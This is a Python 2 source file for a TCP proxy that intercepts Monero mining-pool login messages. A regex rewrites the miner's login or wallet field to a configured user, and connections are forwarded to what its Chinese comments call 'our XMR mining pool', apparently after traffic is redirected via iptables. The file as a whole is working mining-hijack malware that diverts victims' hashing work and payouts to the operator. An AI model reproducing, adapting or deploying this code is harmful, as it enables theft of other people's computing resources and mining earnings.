#-*- encoding: utf-8 -*-
#!/usr/bin/env python
# coding=utf-8

'''
filename:proxy.py
'''

import socket
import select
import sys
import threading
import time
import copy
import Queue
import demjson
import config
import re

def hexdump(src, length=16):
    result = []
    digits = 4 if isinstance(src, unicode) else 2

    for i in xrange(0, len(src), length):
        s = src[i:i + length]
        hexa = b''.join(["%0*X" % (digits, ord(x)) for x in s])
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append(b"%04X  %-*s  %s" % (i, length * (digits + 1), hexa, text))

    print(b'\n'.join(result))



class tcpproxy(object):
    def __init__(self, sport,deremoteip,dereport,deuser):
        self.serverport = sport
        self.defaultremoteip = deremoteip
        self.defaultremoteport= dereport
        self.deuser = deuser
        self.servlist={}
        self.remotelist={}
        self.wait_time = 3
        self.try_cnt = 2
        self.serverqueue = Queue.Queue()
        self.clientqueue = Queue.Queue()
        self.loginstr='\"method\":\"login\",\"params\":{\"login\":'

    def modify_request_data(self, buff):
        try:
            #print "modify user"
            mybuff = buff
            #buff.replace('word', 'python')
            #stringbuff = json.dumps(buff)
            '''
            print buff
            jstr = json.loads(buff)
            print jstr
            login = jstr['params']
            print login
            loginstr = json.dumps(login)
            ljstr = json.loads(loginstr)
            print ljstr
            ljstr['login'] = self.deuser
            print ljstr

            jstr = demjson.decode(mybuff)
            print jstr
            login = jstr['params']
            print login
            jstr['params']['login'] = self.deuser
            jstr['params']['pass'] = jstr['params']['pass']
            jstr['params']['agent'] = jstr['params']['agent']
            print login['login']
            mybuff = demjson.encode(jstr)
            print mybuff
            '''
            mybuff = re.sub('(?<={\"login\"\:").*(?=\",\"pass)', self.deuser, mybuff, count=0, flags=0)
            #print mybuff
            return mybuff

        except   Exception as e:
            #print "modify_request_data   failed.:", repr(e)
            return None

    def is_login_data(self,buff):
        if buff.find(self.loginstr)!= -1:
            #print "login data"
            return self.modify_request_data(buff)
        else:
            return None



    def clean_proxy_chain(self, item):
        #print "clean_proxy_chain:",item
        try:
            if item != None:
                if self.remotelist.has_key(item):
                    try:
                        outflow=self.remotelist[item]
                        if outflow != None:
                            outflow[1].shutdown(socket.SHUT_RDWR)
                            outflow[1].close()
                            self.remotelist.pop(item)
                    except:
                        #print "clean_proxy_chain clean remote list failed:", repr(e)
                        self.remotelist.pop(item)


                if self.servlist.has_key(item):
                    try:
                        localflow = self.servlist[item]
                        localflow[0].shutdown(socket.SHUT_RDWR)
                        localflow[0].close()
                        self.servlist.pop(item)
                    except Exception as e:
                        #print "clean_proxy_chain clean server list failed:", repr(e)
                        self.servlist.pop(item)
        except   Exception as e:
            print "error"
            #print "clean_proxy_chain clean item  failed.:", repr(e)


    def clean_outstream(self, item):
        #print "clean_outstream:", item
        try:
            if item != None:
                if self.remotelist.has_key(item):
                    outflow=self.remotelist[item]
                    if outflow != None:
                        try:
                            outflow[1].shutdown(socket.SHUT_RDWR)
                            outflow[1].close()
                            self.remotelist.pop(item)
                        except Exception as e:
                            #print "clean_outstream clean remote list failed:", repr(e)
                            self.remotelist.pop(item)
        except  Exception as e:
            print "error:"
            #print 'clean_outstream clean item  failed.:', repr(e)



    def localoutstream(self):
        '''
        交换内向外两个流的数据
        '''
        #print "into localoutstream"
        #epoll_instance=epoll()
        #epoll_instance.register(s.fileno(), EPOLLIN | EPOLLET)
        while True:
            dellist =[]
            #print "in localoutstream"
            #item = ['ip','port']

            while not self.serverqueue.empty():
                item = self.serverqueue.get()
                key = item.keys()
                value = item.values()
                #print("localoutstream key:%s -> value:%s" % (key[0], value[0]))
                self.servlist[key[0]] = value[0]

            if len(self.servlist) <= 0:
                time.sleep(3)
                continue

            inputs=[]
            timeout = 2
            for conn in self.servlist:
                #print "localoutstream append conn:",conn
                inputs.append(self.servlist[conn][0])

            readable, writable, exceptional=select.select(inputs, [], [], timeout)
            if not (readable or writable or exceptional):
                #print "localoutstream Time out ! "
                continue;


            sockfd = None
            for s in readable:
                try:
                    #注意，recv函数会阻塞，直到对端完全关闭（close后还需要一定时间才能关闭，最快关闭方法是shutdow）
                    buff = s.recv(1500)
                    for conn in self.servlist:
                        if s == self.servlist[conn][0]:
                            sockfd = conn
                            break

                    if len(buff) == 0: #对端关闭连接，读不到数据
                        #print "localoutstream one closed"
                        dellist.append(sockfd)
                        #self.clean_proxy_chain(item)
                        continue


                    #print("read from local:%s item:%s" % (self.servlist[sockfd][1], sockfd))

                    #print "c>s:"
                    #hexdump(buff)

                    try:
                        mybuff = self.is_login_data(buff)
                        if mybuff != None:
                            buff = mybuff
                    except  Exception as e:
                        print "error"
                        #print 'is_login_data except:', repr(e)


                    #if self.clientmutex.acquire(1):
                    #remotelistcopy = copy.deepcopy(self.remotelist)
                    #print("remotelist:%s" % (self.remotelist))


                    if self.remotelist.has_key(sockfd):
                        #print "c send to s"
                        outflow = self.remotelist[sockfd]
                        outflow[1].sendall(buff)
                    else:
                        #print "new c send to s"
                        newoutflow = self._connect(sockfd,'','',True)
                        newoutflow[sockfd][1].sendall(buff)
                        #self.clientmutex.release()
                except  Exception as e:
                    print "error"
                    #print 'localoutstream except:',repr(e)
                    #print "localoutstream one connect closed."
            #time.sleep(1)

            for conn in dellist:
                self.clean_proxy_chain(conn)

    def remoteinstream(self):
        '''
        交换外向内两个流的数据
        '''
        #print "into remoteinstream"

        while True:
            #item = ['ip','port']
            #print "in remoteinstream"
            dellist=[]
            while not self.clientqueue.empty():
                item = self.clientqueue.get()
                key = item.keys()
                value = item.values()
                #print("remoteinstream key:%s -> value:%s" % (key[0], value[0]))
                self.remotelist[key[0]] = value[0]

            if len(self.remotelist) <= 0:
                time.sleep(3)
                continue

            inputs=[]
            timeout = 2
            for conn in self.remotelist:
                #print "remoteinstream append conn:", conn
                inputs.append(self.remotelist[conn][1])

            readable, writable, exceptional=select.select(inputs, [], [], timeout)
            if not (readable or writable or exceptional):
                #print "remoteinstream Time out ! "
                continue;

            sockfd = None
            for s in readable:
                try:
                    #
                    #注意，recv函数会阻塞，直到对端完全关闭（close后还需要一定时间才能关闭，最快关闭方法是shutdow）
                    buff = s.recv(1500)
                    for conn in self.remotelist:
                        if s == self.remotelist[conn][1]:
                            sockfd = conn
                            break

                    if len(buff) == 0: #对端关闭连接，读不到数据
                        #print "remoteinstream one closed"
                        dellist.append(sockfd)
                        #self.clean_outstream(conn)
                        continue

                    #print("read from server:%s:%s item:%s" % (self.remotelist[sockfd][2], self.remotelist[sockfd][3], sockfd))

                    #print "s>c:"
                    #hexdump(buff)

                    #if self.servermutex.acquire(1):
                    #servlistcopy = copy.deepcopy(self.servlist)
                    #print("servlist:%s" % (self.servlist))

                    if self.servlist.has_key(sockfd):
                        #print "s send to c"
                        outflow=self.servlist[sockfd]
                        #print("outflow[0]:%s" % outflow[0])
                        outflow[0].sendall(buff)
                    else:
                        #print "server clean"
                        #dellist.append(conn)
                        #self.clean_outstream(conn)
                        continue
                        #self.servermutex.release()
                except Exception as e:
                    #print 'remoteinstream except:', repr(e)
                    #print "remoteinstream one connect closed."
                    print "error"

            for conn in dellist:
                self.clean_outstream(conn)

            #time.sleep(1)



    def _server(self):
        '''
        处理服务情况,num为流编号（第0号还是第1号）
        '''
        #print "into _server"
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', int(self.serverport)))
        srv.listen(1)
        while True:
            conn, addr = srv.accept()
            #设置非阻塞
            conn.setblocking(0)
            #print "connected from:", addr
            #print "client port:",addr[1]

            #客户端加入队列
            item = {addr[1]:[conn, addr]}
            #以本地发起连接端口为主键
            #对应servlist
            self.serverqueue.put(item)
            #self.servlist[addr[1]] = item
            #print "in server"


    def _connect(self, lport, host, port, default):
        '''	主动发起连接过程，连接至最终服务器，在iptables模块完成后已此函数通知建立代理通道
        '''
        #print "into _connect"
        if default == True:
            host = self.defaultremoteip
            port = int(self.defaultremoteport)
            #print("default remote:%s:%s" % (host,port))
        else:
            port = int(port)
        not_connet_time = 0
        while True:
            if not_connet_time > self.try_cnt:
                #print('cant not connected')
                return None

            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                conn.connect((host, port))
                conn.setblocking(0)
                #print('connect remote%s:%s!' % (host, port))
            except Exception as e:
                #print('can not connect %s:%s!' % (host, port))
                not_connet_time += 1
                time.sleep(self.wait_time)
                continue

            #以本地发起端口为主键
            #对应remotelist
            item = {lport:[default,conn, host, port]}
            self.clientqueue.put(item)
            return item

    #def start_server(self):
        #t=threading.Thread(target=self._server(), args=(self))
        #t.start()
        #t.join()

    def start_proxy(self):
        #print "into start_proxy"
        tlist=[]  # 线程列表，最终存放两个线程对象
        t=threading.Thread(target=self._server, args=())
        tlist.append(t)
        out=threading.Thread(target=self.localoutstream, args=())
        tlist.append(out)
        #out.join()

        remotein=threading.Thread(target=self.remoteinstream, args=())
        tlist.append(remotein)

        for t in tlist:
            ##print "start thread"
            t.start()
        #for t in tlist:
            ##print "join thread"
            #t.join()
        #remotein.join()

    def connect_xmr(self, lport, host, port):
        #参数4标识是否是默认连接，默认连接则连接至我方xmr矿池
        #此时参数 host 和port无效
        #非默认连接 则连接至 host 和 port指向的服务器
        ret = self._connect(lport, host, port,True)


def test():
    cg=config.config()
    #kill_before(cg.forwardport)
    proxyser = tcpproxy(cg.forwardport, cg.dhost, cg.dport, cg.user)
    #proxy.start_server()
    proxyser.start_proxy()
    time.sleep(3)
    proxyser.connect_xmr('49368','','')
'''
if __name__ == "__main__":
    test()
    sys.exit(0)
'''